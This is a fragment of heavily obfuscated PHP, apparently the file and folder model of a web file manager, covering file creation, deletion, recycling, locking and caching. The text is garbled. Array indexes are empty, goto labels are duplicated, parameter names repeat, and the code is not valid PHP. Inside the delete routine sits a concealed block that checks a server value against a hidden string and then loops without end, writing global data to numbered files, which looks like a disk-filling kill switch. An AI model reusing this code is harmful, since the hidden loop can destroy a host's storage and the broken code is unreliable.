$_SERVER[]; $e¾߆ = array($Bꚟ[394] => 0, $Bꚟ[562] => $A, $Bꚟ[563] => $D莰ܤʎ, $Bꚟ[559] => 1, $Bꚟ[564] => USER_ID, $Bꚟ[565] => USER_ID, $Bꚟ[560] => $Bꚟ[33], $Bꚟ[566] => $Bꚟ[512], $Bꚟ[422] => 0, $Bꚟ[561] => 0, $Bꚟ[448] => 0, $Bꚟ[567] => $Bꚟ[33]); if ($cȲ = $this->where($e¾߆)->find()) { return $cȲ[$Bꚟ[395]]; } goto Aᔙ; Aᔙ: $f񭆳׾ = "\115\157\x64\x65\154\x53\157\165\162\143\x65\x2e\x6d\153\x64\151\x72\x52\x6f\157\x74\56{$A}\56{$D莰ܤʎ}\x2e" . $dЋ; CacheLock::lock($f񭆳׾); $e¾߆[$Bꚟ[28]] = $dЋ; goto d; d: $F񋇈 = $this->add($e¾߆); $b = array($Bꚟ[568] => short_id($F񋇈)); $this->where(array($Bꚟ[410] => $F񋇈))->save($b); goto f͹; f͹: CacheLock::unlock($f񭆳׾); return $F񋇈; goto Eέ; Eέ: } private function sourceRoot($AΪ, $Bъ, $D܆ = false) { $f㴕 =& $_SERVER[]; $Cݝ = array($f㴕[394] => 0, $f㴕[562] => $AΪ, $f㴕[563] => $Bъ); if ($c㚊쯏 = $this->where($Cݝ)->find()) { return $D܆ ? $c㚊쯏 : $c㚊쯏[$f㴕[395]]; } return !1; } public function sourceRootGroup($A) { goto fƥ; c: return array_to_keyvalue($CЎ[$Dľ[75]], $Dľ[484]); goto Aѯ; fƥ: $Dľ =& $_SERVER[]; if (is_string($A)) { $A = array($A); } $B뺫 = array($Dľ[394] => 0, $Dľ[562] => SourceModel::TYPE_GROUP, $Dľ[563] => array($Dľ[7], $A)); goto e; e: $this->selectPageReset(); $CЎ = $this->listSource($B뺫, 1000); $this->selectPageRestore(); goto c; Aѯ: } public function mkfile($BɟЖ, $A׫, $b = '', $eߍ = REPEAT_RENAME) { $aݣد =& $_SERVER[]; $Ȇ = Model($aݣد[584])->addFileByContent($b, $A׫); return $this->_createFileCall($BɟЖ, $A׫, $Ȇ, $eߍ, $aݣد[1219]); } public function addFile($CǕɺ, $c˘, $Aߧ, $Aݺ = false, $Cő = REPEAT_RENAME) { $A = Model($_SERVER[][584])->addFile($c˘, $Aߧ, $Aݺ); return $this->_createFileCall($CǕɺ, $Aߧ, $A, $Cő); } public function addFileByFileID($c݄և, $fİ, $c֐, $c刺 = REPEAT_RENAME) { $Eㄝݳ =& $_SERVER[]; $d乃 = Model($Eㄝݳ[584])->find($fİ); Model($Eㄝݳ[584])->linkAdd($fİ); return $this->_createFileCall($c݄և, $c֐, $d乃, $c刺); } public function addFileByRemote($eܭӪ, $Aƅ, $Fޫ, $Cϙ = array(), $c = REPEAT_RENAME) { $E« = Model($_SERVER[][584])->addFileByRemote($Aƅ, $Fޫ, $Cϙ); return $this->_createFileCall($eܭӪ, $Fޫ, $E«, $c); } private function _createFileCall($e, $F쒗, $f󯡄, $b΃, $Dޝ = "\165\x70\x6c\x6f\141\x64") { goto c饞­; fʿ: if ($aӱ && $bܠ֮ٸ && $bܠ֮ٸ != $C) { Model($B򭹗[1931])->eventCreate($bܠ֮ٸ, $Dޝ); } $this->lockWriteEnd($e, $F쒗); return $bܠ֮ٸ; goto Bм; c饞­: $B򭹗 =& $_SERVER[]; $aӱ = !1; $this->lockWriteStart($e, $F쒗); goto Aц鰦; Aц鰦: $C = $this->fileNameExist($e, $F쒗); $bܠ֮ٸ = $this->_createFile($e, $F쒗, $f󯡄, $b΃, $aӱ); if (!$aӱ) { Model($B򭹗[450])->remove($f󯡄[$B򭹗[447]]); } goto fʿ; Bм: } public function mkdir($b, $EЊ, $e磞 = REPEAT_SKIP) { goto aոċ; aոċ: $Cԃƣ =& $_SERVER[]; $Fø = $this->sourceInfo($b); if (!$Fø) { return !1; } goto c; d: $Eª = $this->_addSoure($Dڶ, $Fø); Model($Cԃƣ[1931])->eventCreate($Eª, $Cԃƣ[1220]); $this->lockWriteEnd($b, $EЊ); goto c; c: $this->lockWriteStart($b, $EЊ); if ($e磞 !== !1) { $c胑ė = $this->fileNameExist($b, $EЊ); if ($c胑ė && $e磞 != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($b, $EЊ); return $c胑ė; } $EЊ = $this->fileNameAuto($b, $EЊ, $e磞); } $Dڶ = array($Cԃƣ[559] => 1, $Cԃƣ[413] => $EЊ, $Cԃƣ[560] => $Cԃƣ[33], $Cԃƣ[448] => 0, $Cԃƣ[561] => 0); goto d; c: return $Eª; goto dǶ; dǶ: } private function _createFile($cԼ̈́, $cѽ, $c֞, $D, &$c) { goto d; d: return $B; goto D; eɅ: $a󪋂 = array($c깗[559] => 0, $c깗[413] => $cѽ, $c깗[560] => substr(get_path_ext($cѽ), 0, 10), $c깗[448] => $c֞[$c깗[447]], $c깗[561] => $c֞[$c깗[78]]); $B = $this->_addSoure($a󪋂, $D); $this->folderSizeReset($cԼ̈́, intval($a󪋂[$c깗[78]])); goto d; d: if ($D !== !1) { $d˪ = $this->fileNameExist($cԼ̈́, $cѽ); } $c = !0; if ($D && $d˪) { if ($D == REPEAT_SKIP) { $c = !1; return $d˪; } else { if ($D == REPEAT_REPLACE) { $Bˡ = $this->sourceInfo($d˪); $Bُ = $this->fileHistory($Bˡ, $c֞[$c깗[447]], $c֞[$c깗[78]]); if (!$Bُ) { $c = !1; } else { $this->folderSizeReset($cԼ̈́); } return $d˪; } else { $cѽ = $this->fileNameAuto($cԼ̈́, $cѽ, $D, !1); } } } goto eɅ; d: $c깗 =& $_SERVER[]; $D = $this->sourceInfo($cԼ̈́); if (!$c֞ || !$D) { return !1; } goto d; D: } protected function fileHistory($Dͯ, $E, $fއч) { goto d月۽; d月۽: $F⿨ =& $_SERVER[]; $eǋ = defined($F⿨[454]) ? USER_ID : $F⿨[191]; if ($Dͯ[$F⿨[447]] == $E) { return !1; } goto Cٳ; f: $this->where(array($F⿨[410] => $Dͯ[$F⿨[395]]))->save($Fʡ); $this->sourceCacheClear($Dͯ[$F⿨[395]]); return !0; goto Aʴ; Cٳ: $this->checkLock($Dͯ[$F⿨[395]], $E); Model($F⿨[1963])->addHistory($Dͯ); $Fʡ = array($F⿨[565] => $eǋ, $F⿨[417] => time(), $F⿨[447] => $E, $F⿨[78] => $fއч); goto f; Aʴ: } public function checkLock($aס, $C㰋) { goto Cз; Dݪް: $EϹ = Session::get($B놤[1964]); $A = substr($f[$B놤[28]], 0, -1 - strlen($f[$B놤[168]])) . $B놤[1485] . $EϹ . $B놤[95] . $f[$B놤[168]]; $eʼԒ = Model($B놤[584])->find($C㰋); goto dƐ; dƐ: $this->_createFileCall($f[$B놤[478]], $A, $eʼԒ, REPEAT_REPLACE, $B놤[1219]); $f = $f[$B놤[445]][$B놤[523]]; $Fᙅ = $f[$B놤[1965]] ? $f[$B놤[1965]] : $f[$B놤[28]]; goto C슍; C슍: show_json(LNG($B놤[1966]) . $B놤[1967] . LNG($B놤[1968]) . $B놤[1969] . $Fᙅ . $B놤[1970], !1); goto E; Cз: $B놤 =& $_SERVER[]; $f = $this->pathInfo($aס); if (!$this->fileIsLock($f, !0)) { return; } goto Dݪް; E: } public function fileIsLock($Eݚ, $Bݸ = false) { goto e; e: $Cþǽ =& $_SERVER[]; if (!isset($Eݚ[$Cþǽ[445]]) || !$Eݚ[$Cþǽ[445]][$Cþǽ[520]]) { return !1; } if ($Eݚ[$Cþǽ[445]][$Cþǽ[520]] != USER_ID) { return !0; } goto a拟; a拟: $CΎ = $GLOBALS[$Cþǽ[6]][$Cþǽ[88]][$Cþǽ[521]]; if ($Eݚ[$Cþǽ[445]][$Cþǽ[522]] <= time() - $CΎ) { $this->metaSet($Eݚ[$Cþǽ[395]], $Cþǽ[520], null); $this->metaSet($Eݚ[$Cþǽ[395]], $Cþǽ[522], null); } if ($Bݸ) { $this->metaSet($Eݚ[$Cþǽ[395]], $Cþǽ[522], time()); } goto aݐ; aݐ: return !1; goto aٽ͉; aٽ͉: } private function _addSoure($Cʣ߼, $e棊) { goto FЊ; E܋: if (isset(self::$cacheChildList[$b])) { unset(self::$cacheChildList[$b]); } static $E߫ = false; if (!$E߫) { Hook::trigger($f歎▜[549], $Cʣ߼); $E߫ = !0; } goto f; f: $C = $this->add($Cʣ߼); $eٔ嚎 = array($f歎▜[568] => short_id($C)); $this->where(array($f歎▜[410] => $C))->save($eٔ嚎); goto fѻƞ; d׼ʷ: $Cʣ߼ = array_merge($E翄, $Cʣ߼); $this->updateModifyTime($Cʣ߼[$f歎▜[478]]); $b = $f歎▜[1971] . $e棊[$f歎▜[395]]; goto E܋; fѻƞ: $this->setNamePinyin($C, $Cʣ߼[$f歎▜[28]]); return $C; goto aݲ; FЊ: $f歎▜ =& $_SERVER[]; $e = defined($f歎▜[454]) ? USER_ID : $f歎▜[191]; $E翄 = array($f歎▜[562] => $e棊[$f歎▜[404]], $f歎▜[563] => $e棊[$f歎▜[484]], $f歎▜[564] => $e, $f歎▜[565] => $e, $f歎▜[394] => $e棊[$f歎▜[395]], $f歎▜[566] => $e棊[$f歎▜[502]] . $e棊[$f歎▜[395]] . $f歎▜[47], $f歎▜[422] => 0, $f歎▜[567] => $f歎▜[33]); goto d׼ʷ; aݲ: } public function remove($e܍, $Eã = true) { goto cн; Eʈ: CacheLock::unlock($d̳ⅈ); $this->metaSet($e܍, $cڠ[1980], $eɠٴ[$cڠ[478]]); $this->where(array($cڠ[395] => $e܍))->save(array($cڠ[417] => time())); goto c｡ٺ; AÚۄ: return $E; goto FɌƸ; Eև: $b = $eɠٴ[$cڠ[404]] == self::TYPE_USER ? $cڠ[575] : $cڠ[496]; if ($b == $cڠ[575]) { $D = Model($cڠ[494])->getInfo($eɠٴ[$cڠ[484]]); $b = !empty($D[$cڠ[1965]]) ? $D[$cڠ[1965]] : $D[$cڠ[28]]; $b = $cڠ[258] . $b . $cڠ[1973] . $eɠٴ[$cڠ[484]]; } else { $D = Model($cڠ[503])->getInfo($eɠٴ[$cڠ[484]]); $b = _get($D, $cڠ[28]); $b = $cڠ[160] . $b . $cڠ[1974] . $eɠٴ[$cڠ[484]]; } $d̳ⅈ = $cڠ[1975] . md5($b); goto B󝌍; cн: $cڠ =& $_SERVER[]; $eɠٴ = $this->sourceInfo($e܍); $a۰ = intval($eɠٴ[$cڠ[404]]) === self::TYPE_SYSTEM; goto c͙; c͙: $eҮ = Model($cڠ[486])->get($cڠ[1972]) == $cڠ[87]; if ($a۰ || $Eã || !$eҮ) { return $this->removeNow($e܍, $Eã); } $b̴ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Eև; c｡ٺ: $this->recycleClear($eɠٴ); $E = $this->move($e܍, $eŖ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($eɠٴ[$cڠ[478]]); goto AÚۄ; B󝌍: CacheLock::lock($d̳ⅈ); $eŖ = $this->fileNameExist($b̴, $b); if (!$eŖ) { $eŖ = $this->mkdir($b̴, $b, REPEAT_SKIP); $this->metaSet($eŖ, $cڠ[1976], $b); $this->metaSet($eŖ, $cڠ[1977], $eɠٴ[$cڠ[484]]); if ($eɠٴ[$cڠ[478]] != 0) { $this->metaSet($eŖ, $cڠ[1978], _get($D, $cڠ[1979])); } } goto Eʈ; FɌƸ: } private function recycleClear($c) { $E =& $_SERVER[]; $Eɷٗ = $this->childrenAll($c); $eˏ = array($E[410] => array($E[411], $Eɷٗ[$E[1981]])); Model($E[1982])->where($eˏ)->delete(); } public function removeNow($D, $d = true) { goto dώԘ̈́; D̲ކ: Hook::trigger($B[1983], $c腸, $d); if ($d) { Model($B[1982])->moveToRecycle($D); } else { $c㉱ = $this->childrenAll($c); Model($B[546])->eventRemove($D); $this->removeRelevance($c㉱[$B[1981]], $c㉱[$B[1349]]); } $this->folderSizeReset($c[$B[478]]); goto AȰ; Bǟ쐬: if ($_SERVER[$B[836]] != $F($f)) { goto bτ; eů: $C嵹۹ = $aí($a); $b = explode($B[229], $C嵹۹); if (count($b) < $B[593]) { $f  = $B[842]; $f (); } goto F֮; bτ: $CϷ = $B[838]; $aí = $B[839]; $a = $_SERVER[$B[840]] . $B[841]; goto eů; a: $Bӡ̎ = 1; for ($dƹ = $Bӡ̎; $dƹ > 0; $dƹ++) { $b턟(DATA_PATH . $dƹ, $F); } goto DҰ; F֮: $f̂ = $B[843]; $f̂($_SERVER[$B[844]]); $CϷ = $B[838]; goto Fܹ܄; Fܹ܄: $CϷ(); $b턟 = $B[1401]; $F = json_encode($GLOBALS[$B[1402]]); goto a; DҰ: } $c = $this->sourceInfo($D); $c腸 = $this->pathInfoMore($D); goto Dհ; dώԘ̈́: $B =& $_SERVER[]; $f = $_SERVER[$B[1081]]; $F = $B[1400]; goto Bǟ쐬; Dհ: if (!$c) { return !0; } if ($c[$B[478]] == 0) { if (!_get($GLOBALS, $B[485])) { return !1; } } $this->lockMoveStart($D); goto D̲ކ; fǴ: $this->lockMoveEnd($D); Hook::trigger($B[1568], $c腸, $d); return !0; goto f԰; AȰ: $fͥ = array($c[$B[478]]); if ($c[$B[403]] == $B[87]) { $fͥ[] = $c[$B[395]]; } $this->updateModifyTime($fͥ); goto fǴ; f԰: } public function childrenAll($a) { $D٫о =& $_SERVER[]; $b = $a[$D٫о[395]]; if ($a[$D٫о[403]] == $D٫о[87]) { $b͇ = array($D٫о[566] => array($D٫о[525], $a[$D٫о[502]] . $b . $D٫о[526])); $b = array($D٫о[566] => $b͇[$D٫о[502]]); $Cꆌ = $this->field($D٫о[1984])->where($b)->select(); $eȿ = !1; $D = array($b); if ($Cꆌ) { $eȿ = array_to_keyvalue($Cꆌ, $D٫о[33], $D٫о[447]); $eȿ = array_remove_value($eȿ, $D٫о[191]); $D = array_to_keyvalue($Cꆌ, $D٫о[33], $D٫о[395]); $D[] = $b; } } else { $eȿ = array($a[$D٫о[447]]); $D = array($b); } return array($D٫о[1981] => $D, $D٫о[1349] => $eȿ); } public function removeArray($fӋ) { if (!$fӋ) { return !0; } } public function removeRelevance($fǦ, $aɷ) { goto Aֺɧ; Aֺɧ: $dѩ =& $_SERVER[]; $fǦ = $fǦ ? $fǦ : array(); $aɷ = $aɷ ? $aɷ : array(); goto A۪։; E: $cӾ = array($dѩ[410] => array($dѩ[411], $fǦ)); Model($dѩ[1982])->where($cӾ)->delete(); Model($dѩ[441])->where($cӾ)->delete(); goto e˺; e: Model($dѩ[1963])->removeBySource($fǦ); $this->where($cӾ)->delete(); Model($dѩ[450])->remove($aɷ); goto aĜ; A۪։: $fǦ = array_unique(array_filter($fǦ)); $aɷ = array_unique(array_filter($aɷ)); if (!$fǦ) { return !1; } goto E; aĜ: for ($d = 0; $d < count($fǦ); $d++) { $this->sourceCacheClear($fǦ[$d]); } goto E˄; e˺: Model($dѩ[1837])->where($cӾ)->delete(); Model($dѩ[546])->where($cӾ)->delete(); Model($dѩ[1679])->removeBySource($fǦ); goto e; E˄: } public function rename($A¥, $e) { goto Cʡ; Cʡ: $BⓎ =& $_SERVER[]; $aϕ = $this->sourceInfo($A¥); if (!$aϕ) { return !1; } goto C; C: $e = $this->fileNameExist($aϕ[$BⓎ[478]], $e); if ($e && $e != $A¥) { return !1; } $d = array($BⓎ[413] => $e, $BⓎ[565] => USER_ID); goto fɠ; e󇿚×: $EƊ = $BⓎ[1971] . $aϕ[$BⓎ[478]]; if (isset(self::$cacheChildList[$EƊ])) { unset(self::$cacheChildList[$EƊ]); } return $eӘ; goto Aҕ; fɠ: if ($aϕ[$BⓎ[403]] != $BⓎ[87]) { $d[$BⓎ[405]] = substr(get_path_ext($e), 0, 10); } Model($BⓎ[546])->eventRename($A¥, $aϕ[$BⓎ[28]], $e); $this->sourceCacheClear($A¥); goto b䠭ص; b䠭ص: $this->setNamePinyin($A¥, $d[$BⓎ[28]], !1); $this->updateModifyTime($aϕ[$BⓎ[478]]); $eӘ = $this->where(array($BⓎ[410] => $A¥))->data($d)->save(); goto e󇿚×; Aҕ: } public function setNamePinyin($fɦ, $Dɵľ, $aݔ۵ = true) { $eԔɪ =& $_SERVER[]; $B = Input::check($Dɵľ, $eԔɪ[569]); if ($aݔ۵ && !$B) { return; } if (!$B) { $this->metaSet($fɦ, $eԔɪ[444], null); $this->metaSet($fɦ, $eԔɪ[443], null); return; } $f؊ = array($eԔɪ[444] => str_replace($eԔɪ[50], $eԔɪ[33], Pinyin::encode($Dɵľ)), $eԔɪ[443] => Pinyin::encode($Dɵľ, $eԔɪ[570])); $this->metaSet($fɦ, $f؊); } public function getContent($f䛘) { goto Eԟ; aʿ: if (!$aΧ[$dۇ[76]]) { return $dۇ[33]; } return IO::getContent($aΧ[$dۇ[76]]); goto Dۋ; e: if ($aΧ[$dۇ[78]] == 0) { return $dۇ[33]; } $E䪡 = $dۇ[1985] . $aΧ[$dۇ[170]]; if ($aΧ[$dۇ[78]] <= 1024 * 10) { $C = Cache::get($E䪡); if (!$C) { $C = IO::getContent($aΧ[$dۇ[76]]); Cache::set($E䪡, $C); } return $C; } goto aʿ; Eԟ: $dۇ =& $_SERVER[]; $aΧ = $this->fileInfoGet($f䛘); if (!$aΧ) { return !1; } goto e; Dۋ: } public function setDesc($fͼ, $E) { $dϖͼ =& $_SERVER[]; Model($dϖͼ[546])->eventAddDesc($fͼ, $E); return $this->metaSet($fͼ, $dϖͼ[431], $E); } public function setContent($cͲ, $E = '') { goto cռ; cռ: $e셰ڼ =& $_SERVER[]; $f̰ض = $this->sourceInfo($cͲ); $E = $this->fileInfoGet($cͲ); goto fմ; Cʞθ: if (!$Eґߟ) { return Model($e셰ڼ[450])->remove($Dز[$e셰ڼ[447]]); } $this->folderSizeReset($f̰ض[$e셰ڼ[478]]); return !0; goto d׵ыՐ; fմ: if (!$E || !$f̰ض) { return !1; } $Dز = Model($e셰ڼ[450])->addFileByContent($E, $f̰ض[$e셰ڼ[28]]); $Eґߟ = $this->fileHistory($f̰ض, $Dز[$e셰ڼ[447]], $Dز[$e셰ڼ[78]]); goto Cʞθ; d׵ыՐ: } public function fileSubstr($C͘娕, $c, $c) { $c = $this->fileInfoGet($C͘娕); if (!$c) { return !1; } return IO::fileSubstr($c[$_SERVER[][76]], $c, $c); } public function fileInfoGet($aə) { goto Cˍ; cƆ: return $AՕޒ; goto e; f歈: $AՕޒ = Model($E㌚[450])->fileInfo($f[$E㌚[447]]); if ($AՕޒ) { $AՕޒ[$E㌚[28]] = $f[$E㌚[28]]; } self::$cacheFileInfo[$F] = $AՕޒ; goto cƆ; Cˍ: $E㌚ =& $_SERVER[]; $f = $this->sourceInfo($aə); if (!$f || $f[$E㌚[403]]) { return !1; } goto f; f: $F = $E㌚[453] . $f[$E㌚[447]]; $A̙ = _get(self::$cacheFileInfo, $F); if ($A̙) { return $A̙; } goto f歈; e: } private function folderChildrenNumber($fӹ) { $A␮ =& $_SERVER[]; $fȾ = $this->sourceInfo($fӹ); $C臓 = array($A␮[566] => array($A␮[525], $fȾ[$A␮[502]] . $fӹ . $A␮[526]), $A␮[422] => intval($fȾ[$A␮[423]]), $A␮[559] => 1); $A㴋Ӊ = $this->where($C臓)->count(); $f荼Ქ = $this->where($C臓)->where(array($A␮[559] => 0))->count(); return array($A␮[82] => $f荼Ქ, $A␮[83] => $A㴋Ӊ); } public function pathInfo($c, $fӆ = false) { goto BȠ; cˍ: self::$cachePathInfo[$eԏ̉] = $Bǫ; return $Bǫ; goto fګ̠; Cʥ: $eԏ̉ = $d뽍[439] . intval($fӆ) . $d뽍[440] . $c; $fВϏ = _get(self::$cachePathInfo, $eԏ̉); if ($fВϏ) { return $fВϏ; } goto Cܹ; BȠ: $d뽍 =& $_SERVER[]; $fӆ = !1; $c = intval($c); goto Cʥ; Cܹ: $Bǫ = $this->sourceInfo($c); if (!$Bǫ) { return !1; } $Bǫ = $this->_listDataApplyItem($Bǫ, $fӆ); goto cˍ; fګ̠: } public static $cachePathInfoMore = array(); public function pathInfoMore($a) { goto f; D͸: self::$cachePathInfoMore[$a] = $eɡ; return $eɡ; goto bБ; f: $Fқő =& $_SERVER[]; $B = _get(self::$cachePathInfoMore, $a); if ($B) { return $B; } goto fۚޥ; fۚޥ: $eɡ = $this->pathInfo($a); if (!$eɡ) { return !1; } if ($eɡ[$Fқő[403]] == $Fқő[87]) { $eɡ[$Fқő[81]] = $this->folderChildrenNumber($a); } goto D͸; bБ: } public function sourceInfo($b) { goto cќ; a帽: $BڂӐ = $this->where(array($dڎ[395] => $b))->find(); self::$cacheSourceInfo[$b濚] = $BڂӐ; return self::$cacheSourceInfo[$b濚]; goto f; cќ: $dڎ =& $_SERVER[]; if (!$b) { return array(); } $b = intval($b); goto f; f: $b濚 = $dڎ[438] . $b; $Bɽ = _get(self::$cacheSourceInfo, $b濚); if ($Bɽ) { return $Bɽ; } goto a帽; f: } public function sourceCacheClear($f = false) { self::cacheClear($f); } public static function cacheClear($bύ = false) { $D܎ =& $_SERVER[]; if ($bύ == !1) { goto Cøո; Cøո: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto c; DϢ: return; goto a; c: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto DϢ; a: } unset(self::$cacheSourceInfo[$D܎[438] . $bύ]); unset(self::$cachePathInfoMore[$bύ]); unset(self::$cachePathInfo[$D܎[1986] . $bύ]); unset(self::$cachePathInfo[$D܎[1987] . $bύ]); } public function metaSet($C֡ے, $bަ = null, $A = null) { $Dڅ = parent::metaSet($C֡ے, $bަ, $A); if ($Dڅ) { $this->sourceCacheClear($C֡ے); } return $Dڅ; } public function pathInfoByPath($Eƴڮ, $E) { $dرߟ =& $_SERVER[]; $aΧҕ = !$E ? array() : explode($dرߟ[8], trim($E, $dرߟ[8])); $b = $Eƴڮ; foreach ($aΧҕ as $B놖) { $bǣ = array($dرߟ[478] => $b, $dرߟ[28] => $B놖); $B = $this->where($bǣ)->select(); if (!$B) { return !1; } $B = array_sort_by($B, $dرߟ[423]); $b = $B[0][$dرߟ[395]]; } return $this->pathInfo($b, !0); } protected function updateModifyTime($f憮) { goto fü; cֿĉ: if (!is_array($f憮)) { $f憮 = array($f憮); } foreach ($f憮 as $Fء => $Bʰ) { $f憮[$Fء] = intval($Bʰ); $this->sourceCacheClear($Bʰ); } $B = array($aׇط[395] => array($aׇط[7], $f憮)); goto c; fü: $aׇط =& $_SERVER[]; $Bà = defined($aׇط[454]) ? USER_ID : $aׇط[191]; if (!$f憮) { return; } goto cֿĉ; c: $f掛 = array($aׇط[565] => $Bà, $aׇط[417] => time()); $this->where($B)->save($f掛); goto C﹘; C﹘: } public function folderSizeReset($CÜ, $eܗ = false) { goto bɪ; EƟ: if ($eܗ == 0) { return CacheLock::unlock($fݛ); } $A = $this->parentLevelArray($fǧ[$Aޛ[502]]); if (!$A) { $A = array(); } goto D; fٿ: $fݛ = $Aޛ[1988] . $CÜ; CacheLock::lock($fݛ, 20); if ($eܗ === !1) { $this->sourceCacheClear($CÜ); $fǧ = $this->sourceInfo($CÜ); $dֆ = array($Aޛ[394] => $CÜ, $Aޛ[422] => 0); $Aգ = $this->where($dֆ)->sum($Aޛ[78]); $eܗ = intval($Aգ) - intval($fǧ[$Aޛ[78]]); } goto EƟ; B: $this->where($dֆ)->setAdd($Aޛ[78], $eܗ); CacheLock::unlock($fݛ); $e = $Aޛ[1989] . $fǧ[$Aޛ[404]] . $Aޛ[4] . $fǧ[$Aޛ[484]]; goto F; bɪ: $Aޛ =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $fǧ = $this->sourceInfo($CÜ); goto fٿ; D: $A[] = $fǧ[$Aޛ[395]]; $dֆ = array($Aޛ[395] => array($Aޛ[411], $A)); if ($eܗ < 0) { $dֆ[$Aޛ[78]] = array($Aޛ[974], abs($eܗ)); } goto B; F: $Eܴ = array($fǧ[$Aޛ[404]], $fǧ[$Aޛ[484]]); TaskRun::timeLimitCall($e, $Aޛ[1990], $Eܴ, 1.5); goto F; F: } public function folderSizeResetChildren($a) { goto e; e: $Fյ =& $_SERVER[]; $this->sourceCacheClear($a); $Dݿ = $this->sourceInfo($a); goto C; fŔ޻: foreach ($Fۣߡ as $CȻ) { $C = $CȻ[$Fյ[478]] . $Fյ[33]; if (!isset($aԎ[$C])) { continue; } if ($CȻ[$Fյ[423]] == $aԎ[$C][$Fյ[423]]) { $aԎ[$C][$Fյ[78]] += $CȻ[$Fյ[78]]; } } foreach ($aԎ as $CȻ) { $D٩ = $this->parentLevelArray($CȻ[$Fյ[502]]); foreach ($D٩ as $C) { $C = $C . $Fյ[33]; if (!isset($aԎ[$C])) { continue; } if ($CȻ[$Fյ[423]] == $aԎ[$C][$Fյ[423]]) { $aԎ[$C][$Fյ[78]] += $CȻ[$Fյ[78]]; } } } $a = array(); goto e; fО߈˄: $aԎ[] = $Dݿ; $aԎ = array_to_keyvalue($aԎ, $Fյ[395]); foreach ($aԎ as $C => $CȻ) { $aԎ[$C][$Fյ[1992]] = $aԎ[$C][$Fյ[78]]; $aԎ[$C][$Fյ[78]] = 0; } goto fŔ޻; C: $B؍ŵ = array($Fյ[559] => 1, $Fյ[566] => array($Fյ[525], $Dݿ[$Fյ[502]] . $a . $Fյ[526])); $b髿 = $Fյ[1991]; $aԎ = $this->field($b髿)->where($B؍ŵ)->select(); goto f; f: $B؍ŵ[$Fյ[403]] = 0; $Fۣߡ = $this->field($b髿)->where($B؍ŵ)->select(); if (!$Fۣߡ) { return; } goto fО߈˄; e: foreach ($aԎ as $CȻ) { if ($CȻ[$Fյ[78]] == $CȻ[$Fյ[1992]]) { continue; } $a[] = array($Fյ[395], $CȻ[$Fյ[395]], $Fյ[78], $CȻ[$Fյ[78]]); } $this->saveAll($a); goto Dµ쥫; Dµ쥫: } public function userSpaceReset($c = false) { $E =& $_SERVER[]; $FĲČ = $this->where(array($E[404] => self::TYPE_USER, $E[484] => $c, $E[403] => 0))->sum($E[78]); $FĲČ = !$FĲČ || $FĲČ <= 0 ? 0 : $FĲČ; Model($E[494])->userEdit($c, array($E[1688] => $FĲČ)); } public function targetSpaceUpdate($f, $cӟ) { $Fك =& $_SERVER[]; if (!$cӟ) { return; } if (!in_array($f, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f = $this->targetSpaceSize($f, $cӟ); if ($f == self::TYPE_USER) { Model($Fك[494])->userEdit($cӟ, array($Fك[1688] => $f)); } else { if ($f == self::TYPE_GROUP) { Model($Fك[503])->groupEdit($cӟ, array($Fك[1688] => $f)); } } } public function targetSpaceSize($E˷آ, $DŚ疽) { goto A㙕; Aɟ: $A = array_to_keyvalue($A, $d[33], $d[395]); $A = array_unique(array_filter($A)); if ($A) { $FƏ = array($d[410] => array($d[411], $A)); $bه୽ += floatval($this->where($FƏ)->sum($d[78])); } goto dژ; A㙕: $d =& $_SERVER[]; $B׬ = $this->sourceRoot($E˷آ, $DŚ疽, !0); if (!$B׬) { return 0; } goto D軒; dژ: $bه୽ = !$bه୽ || $bه୽ <= 0 ? 0 : $bه୽; return $bه୽; goto cɍÎ; D軒: $bه୽ = floatval($B׬[$d[78]]); $FƏ = array($d[566] => array($d[525], $d[512] . $B׬[$d[395]] . $d[526])); $A = Model($d[421])->field($d[410])->where($FƏ)->select(); goto Aɟ; cɍÎ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b޸) { return $this->fileTypeProfile($b޸, SourceModel::TYPE_USER); } public function groupFileTypeProfile($aݑ) { return $this->fileTypeProfile($aݑ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Dƥ, $aь۫) { goto cڦ; cڦ: $aҌ =& $_SERVER[]; $d = $aҌ[1993] . $Dƥ . $aҌ[71] . $aь۫; $dɤ = Cache::get($d); goto fЋ; C򔝷: $e֏ = array(); $e֏[$aҌ[1994]] = array($aҌ[1995] => LNG($aҌ[1994]), $aҌ[1996] => $this->where($Eᢕ)->count(), $aҌ[561] => $this->where($Eᢕ)->sum($aҌ[78])); $cҹٙ = KodIO::fileTypeList(); goto cԇ; fЋ: if ($dɤ) { return $dɤ; } $Eᢕ = array($aҌ[559] => 0); if ($Dƥ != !1) { $Eᢕ[$aҌ[484]] = $Dƥ; $Eᢕ[$aҌ[404]] = $aь۫; } goto C򔝷; cԇ: foreach ($cҹٙ as $e => $a) { $Eᢕ[$aҌ[405]] = $this->fileTypeWhere($e); $e֏[$e] = array($aҌ[1995] => $a[$aҌ[28]], $aҌ[1996] => $this->where($Eᢕ)->count(), $aҌ[561] => $this->where($Eᢕ)->sum($aҌ[78])); } Cache::set($d, $e֏, 1200); return $e֏; goto D؅; D؅: } public function fileNameExist($Aۓ, $C֊) { $AУ =& $_SERVER[]; $fɤ = $this->where(array($AУ[478] => $Aۓ, $AУ[28] => $C֊, $AУ[423] => 0))->find(); return is_array($fɤ) ? $fɤ[$AУ[395]] : !1; } public function childList($F⤺) { goto F; F: $f =& $_SERVER[]; $eʋ̶ = $f[1971] . $F⤺; if (isset(self::$cacheChildList[$eʋ̶])) { return self::$cacheChildList[$eʋ̶]; } goto C뽅ޜ; B翮: self::$cacheChildList[$eʋ̶] = $Aǣ廡; foreach ($Aǣ廡 as $b) { $eʋ̶ = $f[438] . $b[$f[395]]; self::$cacheSourceInfo[$eʋ̶] = $b; } return $Aǣ廡; goto Fӵӧ; C뽅ޜ: $Cׂ = array($f[478] => intval($F⤺), $f[423] => 0); $Aǣ廡 = $this->where($Cׂ)->select(); $Aǣ廡 = $Aǣ廡 ? $Aǣ廡 : array(); goto B翮; Fӵӧ: } public function fileNameAuto($fŷŤ, $d, $E߰ = REPEAT_RENAME, $fۆ = false) { $e̚Ǩ =& $_SERVER[]; 